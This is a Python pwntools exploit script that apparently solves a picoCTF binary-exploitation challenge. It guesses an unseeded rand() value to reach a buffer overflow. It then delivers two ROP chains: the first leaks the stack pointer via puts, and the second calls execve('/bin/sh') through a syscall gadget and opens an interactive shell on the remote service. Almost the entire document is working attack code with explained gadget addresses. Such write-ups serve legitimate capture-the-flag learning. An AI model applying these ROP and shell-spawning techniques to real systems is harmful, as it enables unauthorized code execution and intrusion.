#!/usr/bin/env python3

from pwn import *
from ctypes import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("jupiter.challenges.picoctf.org", 26735)

    return r

'''
Performs the mov rdi, rax instruction using the ROP chain in two main steps
1. mov r14, rax
2. mov rdi, r14
'''
def mov_rax_to_rdi(ropchain):

    # How this mov r14, rax works: 
    #
    # 1. Set rbx to 0x410ca0 so it is called
    # 2. Call 0x44f6c8 and thus call 0x410ca0
    # 
    # Instrs:
    # 0x0000000044f6c8: push rax; call rbx;
    # 0x00000000410ca0: pop r13; pop r14; ret;
    ropchain.rbx = 0x410ca0
    ropchain.raw(0x44f6c8)

    # How this mov rdi, r14 works: 
    # 
    # 1. rbp has alr been loaded with the address of a [pop r14; ret;] gadget
    # 2. 0x45bf5b thus becomes a gadget that will return control to the chain
    # 
    # Instrs
    # 0x0000000045bf5b: mov rdi, r14; call rbp;
    # 0x00000000410ca2: pop r14; ret;
    ropchain.raw(0x45bf5b)

def main():

    r = conn()
    rop1 = ROP(exe, badchars=b'\x0a')
    rop2 = ROP(exe, badchars=b'\x0a')

    # To get to the buffer overflow, we need to pass a check whereby
    # a comparison with an unseeded PRNG value is done
    libc = cdll.LoadLibrary('libc.so.6')
    ans = libc.rand()%100 + 1

    r.sendlineafter(b'guess?\n', str(ans).encode())


    '''
    ROP CHAIN 1
    - Leaking rsp (which will be a fixed offset from the input buffer for the next ROP chain)
    '''
    # Leaks rsp to rax
    rop1.rdx=0x44cc49 # Set $rdx to point to a [pop rdx; pop rsi; ret] gadget where the old rip wil be popped first into rdx
    rop1.raw(0x48315a) # Main point is push rsp, and the gadget also ends up calling rdx
    rop1.raw(0x410b62) # mov rax, rsi

    # Also fill rdi with the leaked rsp value
    mov_rax_to_rdi(rop1)

    # Write the leaked rsp to the 8th byte from the memory pointed to by the leaked rsp
    rop1.raw(0x4172c6) # mov [rdi+0x8], rax; ret;

    # Add 8 to rdi
    rop1.rbx = 8
    rop1.rbp = 0x44cc4a # Set $rbp to point to a [pop rsi; ret] gadget
    rop1.raw(0x490d13) # add rdi, rbx; call rbp;

    # Realign the stack before puts with a [ret] gadget
    rop1.raw(0x44cc4b)

    # Call puts(), then win() again to reopen the attack vector
    rop1.puts()
    rop1.win()

    log.info("ROP Chain 1: \n" + rop1.dump())

    # Deliver payload
    r.sendlineafter(b'Name? ', b'A' * 0x70 + p64(0x410ca2) + rop1.chain())

    # Extract the leaked rsp
    r.recvuntil(b'\n\n')
    leaked_rsp = u64(r.recvline().strip().ljust(8,b'\x00'))
    log.info(f"{hex(leaked_rsp)=}")

    # If this assertion does not hold, then it is likely that the address has some bad char
    assert len(hex(leaked_rsp)) == len('0x7fffe4e30570')

    '''
    ROP CHAIN 2
    '''
    # Setup registers for syscall
    rop2(rax=0x3b, rdi=leaked_rsp, rsi=0, rdx=0)

    # Syscall gadget
    rop2.raw(0x40137c)

    log.info("ROP Chain 2: \n" + rop2.dump())

    # Deliver payload
    r.sendlineafter(b'Name? ', b'/bin/sh\x00' + b'A' * 0x70 + rop2.chain())

    r.interactive()


if __name__ == "__main__":
    main()
